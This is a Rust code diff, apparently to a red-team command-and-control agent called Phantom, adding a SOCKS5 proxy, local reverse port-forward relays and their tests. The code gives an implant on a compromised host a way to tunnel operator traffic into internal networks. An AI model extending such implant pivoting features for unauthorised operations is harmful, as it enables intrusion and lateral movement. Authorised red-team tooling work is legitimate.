@@ -37,7 +37,10 @@ pub(crate) enum PendingCallback {
 pub(crate) struct PhantomState {
     mem_files: HashMap<u32, MemFile>,
     reverse_port_forwards: HashMap<u32, ReversePortForward>,
+    socks_proxies: HashMap<u32, SocksProxy>,
     sockets: HashMap<u32, ManagedSocket>,
+    local_relays: HashMap<u32, LocalRelayConnection>,
+    socks_clients: HashMap<u32, SocksClient>,
     pending_callbacks: Vec<PendingCallback>,
 }
 
@@ -50,10 +53,24 @@ struct MemFile {
 #[derive(Debug)]
 struct ReversePortForward {
     listener: TcpListener,
+    mode: ReversePortForwardMode,
     bind_addr: u32,
     bind_port: u32,
     forward_addr: u32,
     forward_port: u32,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ReversePortForwardMode {
+    Teamserver,
+    Local,
+}
+
+#[derive(Debug)]
+struct SocksProxy {
+    listener: TcpListener,
+    bind_addr: u32,
+    bind_port: u32,
 }
 
 #[derive(Debug)]
@@ -64,6 +81,41 @@ struct ManagedSocket {
     bind_port: u32,
     forward_addr: u32,
     forward_port: u32,
+}
+
+#[derive(Debug)]
+struct LocalRelayConnection {
+    left: TcpStream,
+    right: TcpStream,
+    parent_id: u32,
+}
+
+#[derive(Debug)]
+struct SocksClient {
+    stream: TcpStream,
+    server_id: u32,
+    state: SocksClientState,
+}
+
+#[derive(Debug)]
+enum SocksClientState {
+    Greeting { buffer: Vec<u8> },
+    Request { buffer: Vec<u8> },
+    Relay { target: TcpStream },
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct SocksConnectRequest {
+    atyp: u8,
+    address: Vec<u8>,
+    port: u16,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum SocksRequestError {
+    GeneralFailure,
+    CommandNotSupported,
+    AddressTypeNotSupported,
 }
 
 #[derive(Debug)]
@@ -149,11 +201,22 @@ const MEM_COMMIT: u32 = 0x1000;
 const MEM_PRIVATE: u32 = 0x20_000;
 const MEM_MAPPED: u32 = 0x40_000;
 const MEM_IMAGE: u32 = 0x100_0000;
+const SOCKS_VERSION: u8 = 5;
+const SOCKS_METHOD_NO_AUTH: u8 = 0;
+const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
+const SOCKS_COMMAND_CONNECT: u8 = 1;
+const SOCKS_REPLY_SUCCEEDED: u8 = 0;
+const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
+const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
+const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;
 
 impl PhantomState {
     pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
-        self.accept_reverse_port_forward_clients()?;
-        self.poll_sockets().await
+        self.accept_reverse_port_forward_clients().await?;
+        self.accept_socks_proxy_clients()?;
+        self.poll_sockets().await?;
+        self.poll_local_relays()?;
+        self.poll_socks_clients().await
     }
 
     pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
@@ -164,7 +227,7 @@ impl PhantomState {
         self.pending_callbacks.push(callback);
     }
 
-    fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
+    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
         let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
         let mut accepted = Vec::new();
 
@@ -181,6 +244,7 @@ impl PhantomState {
                             .map_err(|error| PhantomError::Socket(error.to_string()))?;
                         accepted.push((
                             listener_id,
+                            listener.mode,
                             listener.bind_addr,
                             listener.bind_port,
                             listener.forward_addr,
@@ -196,33 +260,95 @@ impl PhantomState {
             }
         }
 
-        for (listener_id, bind_addr, bind_port, forward_addr, forward_port, stream) in accepted {
-            let socket_id = self.allocate_socket_id();
-            self.sockets.insert(
-                socket_id,
-                ManagedSocket {
+        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
+            accepted
+        {
+            match mode {
+                ReversePortForwardMode::Teamserver => {
+                    let socket_id = self.allocate_socket_id();
+                    self.sockets.insert(
+                        socket_id,
+                        ManagedSocket {
+                            stream,
+                            socket_type: DemonSocketType::Client,
+                            bind_addr,
+                            bind_port,
+                            forward_addr,
+                            forward_port,
+                        },
+                    );
+                    self.queue_callback(PendingCallback::Socket {
+                        request_id: 0,
+                        payload: encode_socket_open(
+                            socket_id,
+                            bind_addr,
+                            bind_port,
+                            forward_addr,
+                            forward_port,
+                        ),
+                    });
+
+                    if !self.reverse_port_forwards.contains_key(&listener_id) {
+                        self.remove_socket(socket_id);
+                    }
+                }
+                ReversePortForwardMode::Local => {
+                    if !self.reverse_port_forwards.contains_key(&listener_id) {
+                        continue;
+                    }
+                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
+                    {
+                        self.local_relays.insert(
+                            self.allocate_socket_id(),
+                            LocalRelayConnection {
+                                left: stream,
+                                right: target,
+                                parent_id: listener_id,
+                            },
+                        );
+                    }
+                }
+            }
+        }
+
+        Ok(())
+    }
+
+    fn accept_socks_proxy_clients(&mut self) -> Result<(), PhantomError> {
+        let server_ids = self.socks_proxies.keys().copied().collect::<Vec<_>>();
+        let mut accepted = Vec::new();
+
+        for server_id in server_ids {
+            let Some(proxy) = self.socks_proxies.get(&server_id) else {
+                continue;
+            };
+
+            loop {
+                match proxy.listener.accept() {
+                    Ok((stream, _peer)) => {
+                        stream
+                            .set_nonblocking(true)
+                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
+                        accepted.push((server_id, stream));
+                    }
+                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
+                    Err(error) => return Err(PhantomError::Socket(error.to_string())),
+                }
+            }
+        }
+
+        for (server_id, stream) in accepted {
+            if !self.socks_proxies.contains_key(&server_id) {
+                continue;
+            }
+            self.socks_clients.insert(
+                self.allocate_socket_id(),
+                SocksClient {
                     stream,
-                    socket_type: DemonSocketType::Client,
-                    bind_addr,
-                    bind_port,
-                    forward_addr,
-                    forward_port,
+                    server_id,
+                    state: SocksClientState::Greeting { buffer: Vec::new() },
                 },
             );
-            self.queue_callback(PendingCallback::Socket {
-                request_id: 0,
-                payload: encode_socket_open(
-                    socket_id,
-                    bind_addr,
-                    bind_port,
-                    forward_addr,
-                    forward_port,
-                ),
-            });
-
-            if !self.reverse_port_forwards.contains_key(&listener_id) {
-                self.remove_socket(socket_id);
-            }
         }
 
         Ok(())
@@ -290,12 +416,149 @@ impl PhantomState {
         Ok(())
     }
 
+    fn poll_local_relays(&mut self) -> Result<(), PhantomError> {
+        let relay_ids = self.local_relays.keys().copied().collect::<Vec<_>>();
+        let mut removals = Vec::new();
+
+        for relay_id in relay_ids {
+            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
+                continue;
+            };
+
+            let left_result = pump_stream(&mut relay.left, &mut relay.right);
+            let right_result = pump_stream(&mut relay.right, &mut relay.left);
+            if left_result || right_result {
+                removals.push(relay_id);
+            }
+        }
+
+        for relay_id in removals {
+            self.local_relays.remove(&relay_id);
+        }
+
+        Ok(())
+    }
+
+    async fn poll_socks_clients(&mut self) -> Result<(), PhantomError> {
+        let client_ids = self.socks_clients.keys().copied().collect::<Vec<_>>();
+        let mut removals = Vec::new();
+
+        for client_id in client_ids {
+            let Some(client) = self.socks_clients.get_mut(&client_id) else {
+                continue;
+            };
+
+            match &mut client.state {
+                SocksClientState::Greeting { buffer } => {
+                    let closed = read_available(&mut client.stream, buffer)?;
+                    if closed {
+                        removals.push(client_id);
+                        continue;
+                    }
+
+                    match try_parse_socks_greeting(buffer) {
+                        None => {}
+                        Some(Ok(consumed)) => {
+                            let remainder = buffer.split_off(consumed);
+                            write_all_nonblocking(
+                                &mut client.stream,
+                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
+                            )
+                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
+                            client.state = SocksClientState::Request { buffer: remainder };
+                        }
+                        Some(Err(method)) => {
+                            let _ =
+                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
+                            removals.push(client_id);
+                        }
+                    }
+                }
+                SocksClientState::Request { buffer } => {
+                    let closed = read_available(&mut client.stream, buffer)?;
+                    if closed {
+                        removals.push(client_id);
+                        continue;
+                    }
+
+                    match try_parse_socks_request(buffer) {
+                        None => {}
+                        Some(Ok((consumed, request))) => {
+                            let remainder = buffer.split_off(consumed);
+                            match connect_socks_target(request.atyp, &request.address, request.port)
+                                .await
+                            {
+                                Ok(mut target) => {
+                                    send_socks_reply(
+                                        &mut client.stream,
+                                        SOCKS_REPLY_SUCCEEDED,
+                                        request.atyp,
+                                        &request.address,
+                                        request.port,
+                                    )?;
+                                    if !remainder.is_empty() {
+                                        write_all_nonblocking(&mut target, &remainder).map_err(
+                                            |error| PhantomError::Socket(error.to_string()),
+                                        )?;
+                                    }
+                                    client.state = SocksClientState::Relay { target };
+                                }
+                                Err(_error_code) => {
+                                    send_socks_reply(
+                                        &mut client.stream,
+                                        SOCKS_REPLY_GENERAL_FAILURE,
+                                        request.atyp,
+                                        &request.address,
+                                        request.port,
+                                    )?;
+                                    removals.push(client_id);
+                                }
+                            }
+                        }
+                        Some(Err(error)) => {
+                            let reply = match error {
+                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
+                                SocksRequestError::CommandNotSupported => {
+                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
+                                }
+                                SocksRequestError::AddressTypeNotSupported => {
+                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
+                                }
+                            };
+                            let _ = write_all_nonblocking(
+                                &mut client.stream,
+                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
+                            );
+                            removals.push(client_id);
+                        }
+                    }
+                }
+                SocksClientState::Relay { target } => {
+                    let client_failed = pump_stream(&mut client.stream, target);
+                    let target_failed = pump_stream(target, &mut client.stream);
+                    if client_failed || target_failed {
+                        removals.push(client_id);
+                    }
+                }
+            }
+        }
+
+        for client_id in removals {
+            self.socks_clients.remove(&client_id);
+        }
+
+        Ok(())
+    }
+
     fn allocate_socket_id(&self) -> u32 {
-        let mut socket_id = rand::random::<u32>() | 1;
+        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
         while self.sockets.contains_key(&socket_id)
             || self.reverse_port_forwards.contains_key(&socket_id)
+            || self.socks_proxies.contains_key(&socket_id)
+            || self.local_relays.contains_key(&socket_id)
+            || self.socks_clients.contains_key(&socket_id)
         {
-            socket_id = rand::random::<u32>() | 1;
+            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
         }
         socket_id
     }
@@ -322,6 +585,49 @@ impl PhantomState {
         };
 
         self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
+    }
+
+    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
+        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
+            return;
+        };
+
+        let client_ids = self
+            .sockets
+            .iter()
+            .filter_map(|(client_id, socket)| {
+                (socket.socket_type == DemonSocketType::Client
+                    && socket.bind_addr == listener.bind_addr
+                    && socket.bind_port == listener.bind_port
+                    && socket.forward_addr == listener.forward_addr
+                    && socket.forward_port == listener.forward_port)
+                    .then_some(*client_id)
+            })
+            .collect::<Vec<_>>();
+        for client_id in client_ids {
+            self.remove_socket(client_id);
+        }
+
+        let relay_ids = self
+            .local_relays
+            .iter()
+            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
+            .collect::<Vec<_>>();
+        for relay_id in relay_ids {
+            self.local_relays.remove(&relay_id);
+        }
+
+        self.queue_callback(PendingCallback::Socket {
+            request_id: 0,
+            payload: encode_rportfwd_remove(
+                socket_id,
+                DemonSocketType::ReversePortForward,
+                listener.bind_addr,
+                listener.bind_port,
+                listener.forward_addr,
+                listener.forward_port,
+            ),
+        });
     }
 }
 
@@ -765,67 +1071,32 @@ async fn execute_socket(
 
     match subcommand {
         DemonSocketCommand::ReversePortForwardAdd => {
-            let bind_addr = u32::try_from(parser.int32()?).map_err(|_| {
-                PhantomError::TaskParse("negative reverse port-forward bind address")
-            })?;
-            let bind_port = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
-            let forward_addr = u32::try_from(parser.int32()?).map_err(|_| {
-                PhantomError::TaskParse("negative reverse port-forward forward address")
-            })?;
-            let forward_port = u32::try_from(parser.int32()?).map_err(|_| {
-                PhantomError::TaskParse("negative reverse port-forward forward port")
-            })?;
-
-            let listener_id = state.allocate_socket_id();
-            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
-            match TcpListener::bind(bind_socket) {
-                Ok(listener) => {
-                    listener
-                        .set_nonblocking(true)
-                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
-                    state.reverse_port_forwards.insert(
-                        listener_id,
-                        ReversePortForward {
-                            listener,
-                            bind_addr,
-                            bind_port,
-                            forward_addr,
-                            forward_port,
-                        },
-                    );
-                    state.queue_callback(PendingCallback::Socket {
-                        request_id,
-                        payload: encode_rportfwd_add(
-                            true,
-                            listener_id,
-                            bind_addr,
-                            bind_port,
-                            forward_addr,
-                            forward_port,
-                        ),
-                    });
-                }
-                Err(_error) => {
-                    state.queue_callback(PendingCallback::Socket {
-                        request_id,
-                        payload: encode_rportfwd_add(
-                            false,
-                            0,
-                            bind_addr,
-                            bind_port,
-                            forward_addr,
-                            forward_port,
-                        ),
-                    });
-                }
-            }
+            let (bind_addr, bind_port, forward_addr, forward_port) =
+                parse_reverse_port_forward_target(&mut parser)?;
+            handle_reverse_port_forward_add(
+                request_id,
+                state,
+                ReversePortForwardMode::Teamserver,
+                bind_addr,
+                bind_port,
+                forward_addr,
+                forward_port,
+                DemonSocketCommand::ReversePortForwardAdd,
+            )?;
         }
         DemonSocketCommand::ReversePortForwardAddLocal => {
-            state.queue_callback(PendingCallback::Error {
+            let (bind_addr, bind_port, forward_addr, forward_port) =
+                parse_reverse_port_forward_target(&mut parser)?;
+            handle_reverse_port_forward_add(
                 request_id,
-                text: String::from("reverse-port-forward add-local is not implemented in Phantom"),
-            });
+                state,
+                ReversePortForwardMode::Local,
+                bind_addr,
+                bind_port,
+                forward_addr,
+                forward_port,
+                DemonSocketCommand::ReversePortForwardAddLocal,
+            )?;
         }
         DemonSocketCommand::ReversePortForwardList => {
             let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
@@ -839,7 +1110,10 @@ async fn execute_socket(
             state.queue_callback(PendingCallback::Socket { request_id, payload });
         }
         DemonSocketCommand::ReversePortForwardClear => {
-            state.reverse_port_forwards.clear();
+            let listener_ids = state.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
+            for listener_id in listener_ids {
+                state.remove_reverse_port_forward(listener_id);
+            }
             let client_ids = state
                 .sockets
                 .iter()
@@ -858,42 +1132,84 @@ async fn execute_socket(
         DemonSocketCommand::ReversePortForwardRemove => {
             let socket_id = u32::try_from(parser.int32()?)
                 .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
-            if let Some(listener) = state.reverse_port_forwards.remove(&socket_id) {
+            if state.reverse_port_forwards.contains_key(&socket_id) {
+                let callbacks_before = state.pending_callbacks.len();
+                state.remove_reverse_port_forward(socket_id);
+                if let Some(PendingCallback::Socket { request_id: callback_request_id, .. }) =
+                    state.pending_callbacks.get_mut(callbacks_before)
+                {
+                    *callback_request_id = request_id;
+                }
+            }
+        }
+        DemonSocketCommand::SocksProxyAdd => {
+            let bind_addr = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind address"))?;
+            let bind_port = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind port"))?;
+            let listener_id = state.allocate_socket_id();
+            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
+            match TcpListener::bind(bind_socket) {
+                Ok(listener) => {
+                    listener
+                        .set_nonblocking(true)
+                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
+                    let bound_port = listener
+                        .local_addr()
+                        .map(|addr| u32::from(addr.port()))
+                        .unwrap_or(bind_port);
+                    state.socks_proxies.insert(
+                        listener_id,
+                        SocksProxy { listener, bind_addr, bind_port: bound_port },
+                    );
+                    state.queue_callback(PendingCallback::Socket {
+                        request_id,
+                        payload: encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
+                    });
+                }
+                Err(_error) => {
+                    state.queue_callback(PendingCallback::Socket {
+                        request_id,
+                        payload: encode_socks_proxy_add(false, 0, bind_addr, bind_port),
+                    });
+                }
+            }
+        }
+        DemonSocketCommand::SocksProxyList => {
+            let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
+            for (socket_id, proxy) in &state.socks_proxies {
+                payload.extend_from_slice(&encode_u32(*socket_id));
+                payload.extend_from_slice(&encode_u32(proxy.bind_addr));
+                payload.extend_from_slice(&encode_u32(proxy.bind_port));
+            }
+            state.queue_callback(PendingCallback::Socket { request_id, payload });
+        }
+        DemonSocketCommand::SocksProxyRemove => {
+            let socket_id = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative socks proxy socket id"))?;
+            if state.socks_proxies.remove(&socket_id).is_some() {
                 let client_ids = state
-                    .sockets
+                    .socks_clients
                     .iter()
-                    .filter_map(|(client_id, socket)| {
-                        (socket.socket_type == DemonSocketType::Client
-                            && socket.bind_addr == listener.bind_addr
-                            && socket.bind_port == listener.bind_port
-                            && socket.forward_addr == listener.forward_addr
-                            && socket.forward_port == listener.forward_port)
-                            .then_some(*client_id)
+                    .filter_map(|(client_id, client)| {
+                        (client.server_id == socket_id).then_some(*client_id)
                     })
                     .collect::<Vec<_>>();
                 for client_id in client_ids {
-                    state.remove_socket(client_id);
+                    state.socks_clients.remove(&client_id);
                 }
                 state.queue_callback(PendingCallback::Socket {
                     request_id,
-                    payload: encode_rportfwd_remove(
-                        socket_id,
-                        DemonSocketType::ReversePortForward,
-                        listener.bind_addr,
-                        listener.bind_port,
-                        listener.forward_addr,
-                        listener.forward_port,
-                    ),
+                    payload: encode_socks_proxy_remove(socket_id),
                 });
             }
         }
-        DemonSocketCommand::SocksProxyAdd
-        | DemonSocketCommand::SocksProxyList
-        | DemonSocketCommand::SocksProxyRemove
-        | DemonSocketCommand::SocksProxyClear => {
-            state.queue_callback(PendingCallback::Error {
+        DemonSocketCommand::SocksProxyClear => {
+            state.socks_proxies.clear();
+            state.socks_clients.clear();
+            state.queue_callback(PendingCallback::Socket {
                 request_id,
-                text: format!("socket subcommand {subcommand:?} is not implemented in Phantom"),
+                payload: encode_socks_proxy_clear(true),
             });
         }
         DemonSocketCommand::Open => {
@@ -1061,6 +1377,81 @@ fn write_to_socket(
     Ok(())
 }
 
+fn parse_reverse_port_forward_target(
+    parser: &mut TaskParser<'_>,
+) -> Result<(u32, u32, u32, u32), PhantomError> {
+    let bind_addr = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind address"))?;
+    let bind_port = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
+    let forward_addr = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward address"))?;
+    let forward_port = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward port"))?;
+    Ok((bind_addr, bind_port, forward_addr, forward_port))
+}
+
+fn handle_reverse_port_forward_add(
+    request_id: u32,
+    state: &mut PhantomState,
+    mode: ReversePortForwardMode,
+    bind_addr: u32,
+    bind_port: u32,
+    forward_addr: u32,
+    forward_port: u32,
+    command: DemonSocketCommand,
+) -> Result<(), PhantomError> {
+    let listener_id = state.allocate_socket_id();
+    let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
+    match TcpListener::bind(bind_socket) {
+        Ok(listener) => {
+            listener
+                .set_nonblocking(true)
+                .map_err(|error| PhantomError::Socket(error.to_string()))?;
+            let bound_port =
+                listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
+            state.reverse_port_forwards.insert(
+                listener_id,
+                ReversePortForward {
+                    listener,
+                    mode,
+                    bind_addr,
+                    bind_port: bound_port,
+                    forward_addr,
+                    forward_port,
+                },
+            );
+            state.queue_callback(PendingCallback::Socket {
+                request_id,
+                payload: encode_port_forward_add(
+                    command,
+                    true,
+                    listener_id,
+                    bind_addr,
+                    bound_port,
+                    forward_addr,
+                    forward_port,
+                ),
+            });
+        }
+        Err(_error) => {
+            state.queue_callback(PendingCallback::Socket {
+                request_id,
+                payload: encode_port_forward_add(
+                    command,
+                    false,
+                    0,
+                    bind_addr,
+                    bind_port,
+                    forward_addr,
+                    forward_port,
+                ),
+            });
+        }
+    }
+    Ok(())
+}
+
 async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
     let target = match atyp {
         1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
@@ -1093,6 +1484,119 @@ async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStr
     let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
     stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
     Ok(stream)
+}
+
+async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
+    let octets = Ipv4Addr::from(addr).octets();
+    connect_socks_target(1, &octets, port).await
+}
+
+fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, PhantomError> {
+    let mut chunk = [0_u8; 4096];
+    loop {
+        match stream.read(&mut chunk) {
+            Ok(0) => return Ok(true),
+            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
+            Err(error) if error.kind() == ErrorKind::WouldBlock => return Ok(false),
+            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
+            Err(error) => return Err(PhantomError::Socket(error.to_string())),
+        }
+    }
+}
+
+fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
+    let mut buffer = [0_u8; 4096];
+    loop {
+        match source.read(&mut buffer) {
+            Ok(0) => return true,
+            Ok(read) => {
+                if write_all_nonblocking(sink, &buffer[..read]).is_err() {
+                    return true;
+                }
+            }
+            Err(error) if error.kind() == ErrorKind::WouldBlock => return false,
+            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
+            Err(_) => return true,
+        }
+    }
+}
+
+fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
+    if buffer.len() < 2 {
+        return None;
+    }
+    if buffer[0] != SOCKS_VERSION {
+        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
+    }
+    let total = 2 + usize::from(buffer[1]);
+    if buffer.len() < total {
+        return None;
+    }
+    if !buffer[2..total].contains(&SOCKS_METHOD_NO_AUTH) {
+        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
+    }
+    Some(Ok(total))
+}
+
+fn try_parse_socks_request(
+    buffer: &[u8],
+) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
+    if buffer.len() < 4 {
+        return None;
+    }
+    if buffer[0] != SOCKS_VERSION {
+        return Some(Err(SocksRequestError::GeneralFailure));
+    }
+    if buffer[1] != SOCKS_COMMAND_CONNECT {
+        return Some(Err(SocksRequestError::CommandNotSupported));
+    }
+
+    let atyp = buffer[3];
+    let address_len = match atyp {
+        1 => 4,
+        3 => {
+            if buffer.len() < 5 {
+                return None;
+            }
+            usize::from(buffer[4]) + 1
+        }
+        4 => 16,
+        _ => return Some(Err(SocksRequestError::AddressTypeNotSupported)),
+    };
+
+    let header_len = 4 + address_len;
+    if buffer.len() < header_len + 2 {
+        return None;
+    }
+
+    let address = match atyp {
+        3 => buffer[5..header_len].to_vec(),
+        _ => buffer[4..header_len].to_vec(),
+    };
+    let port = u16::from_be_bytes([buffer[header_len], buffer[header_len + 1]]);
+    Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
+}
+
+fn send_socks_reply(
+    stream: &mut TcpStream,
+    reply: u8,
+    atyp: u8,
+    address: &[u8],
+    port: u16,
+) -> Result<(), PhantomError> {
+    let mut response = vec![SOCKS_VERSION, reply, 0, atyp];
+    match atyp {
+        3 => {
+            let length = u8::try_from(address.len())
+                .map_err(|_| PhantomError::Socket(String::from("SOCKS domain too long")))?;
+            response.push(length);
+            response.extend_from_slice(address);
+        }
+        _ => response.extend_from_slice(address),
+    }
+    response.extend_from_slice(&port.to_be_bytes());
+    write_all_nonblocking(stream, &response)
+        .map_err(|error| PhantomError::Socket(error.to_string()))
 }
 
 fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
@@ -1772,7 +2276,8 @@ fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
     encode_bytes(&encoded)
 }
 
-fn encode_rportfwd_add(
+fn encode_port_forward_add(
+    command: DemonSocketCommand,
     success: bool,
     socket_id: u32,
     bind_addr: u32,
@@ -1780,7 +2285,7 @@ fn encode_rportfwd_add(
     forward_addr: u32,
     forward_port: u32,
 ) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardAdd));
+    let mut payload = encode_u32(u32::from(command));
     payload.extend_from_slice(&encode_bool(success));
     payload.extend_from_slice(&encode_u32(socket_id));
     payload.extend_from_slice(&encode_u32(bind_addr));
@@ -1860,6 +2365,26 @@ fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<
     payload
 }
 
+fn encode_socks_proxy_add(
+    success: bool,
+    socket_id: u32,
+    bind_addr: u32,
+    bind_port: u32,
+) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
+    payload.extend_from_slice(&encode_bool(success));
+    payload.extend_from_slice(&encode_u32(socket_id));
+    payload.extend_from_slice(&encode_u32(bind_addr));
+    payload.extend_from_slice(&encode_u32(bind_port));
+    payload
+}
+
+fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
+    payload.extend_from_slice(&encode_u32(socket_id));
+    payload
+}
+
 fn encode_rportfwd_remove(
     socket_id: u32,
     socket_type: DemonSocketType,
@@ -1880,6 +2405,12 @@ fn encode_rportfwd_remove(
 
 fn encode_socket_clear(success: bool) -> Vec<u8> {
     let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
+    payload.extend_from_slice(&encode_bool(success));
+    payload
+}
+
+fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
     payload.extend_from_slice(&encode_bool(success));
     payload
 }
@@ -1939,12 +2470,15 @@ impl PendingCallback {
 
 #[cfg(test)]
 mod tests {
+    use std::time::Duration;
+
     use std::net::Ipv4Addr;
 
     use red_cell_common::demon::{
         DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
         DemonSocketCommand,
     };
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
     use super::{
         GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE_READ,
@@ -1990,6 +2524,28 @@ mod tests {
             .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
             .collect::<Vec<_>>();
         String::from_utf16(&utf16).expect("utf16")
+    }
+
+    async fn poll_until<F>(state: &mut PhantomState, mut predicate: F)
+    where
+        F: FnMut(&PhantomState) -> bool,
+    {
+        for _ in 0..100 {
+            state.poll().await.expect("poll");
+            if predicate(state) {
+                return;
+            }
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
+
+        panic!("condition not met before poll timeout");
+    }
+
+    async fn poll_n(state: &mut PhantomState, iterations: usize) {
+        for _ in 0..iterations {
+            state.poll().await.expect("poll");
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
     }
 
     #[tokio::test]
@@ -2250,6 +2806,219 @@ mod tests {
             state.drain_callbacks().as_slice(),
             [PendingCallback::Socket { request_id: 5, .. }]
         ));
+    }
+
+    #[tokio::test]
+    async fn reverse_port_forward_add_local_relays_data() {
+        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
+        let target_port = target.local_addr().expect("target addr").port();
+        let target_task = tokio::spawn(async move {
+            let (mut stream, _) = target.accept().await.expect("accept target");
+            let mut buffer = [0_u8; 32];
+            let read = stream.read(&mut buffer).await.expect("read target");
+            stream.write_all(&buffer[..read]).await.expect("write target");
+        });
+
+        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
+        let bind_port = listener.local_addr().expect("bind addr").port();
+        drop(listener);
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(
+            &(DemonSocketCommand::ReversePortForwardAddLocal as i32).to_le_bytes(),
+        );
+        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
+        payload.extend_from_slice(&(i32::from(bind_port)).to_le_bytes());
+        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
+        payload.extend_from_slice(&(i32::from(target_port)).to_le_bytes());
+
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 6, payload), &mut state)
+            .await
+            .expect("socket");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { request_id: 6, payload }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(
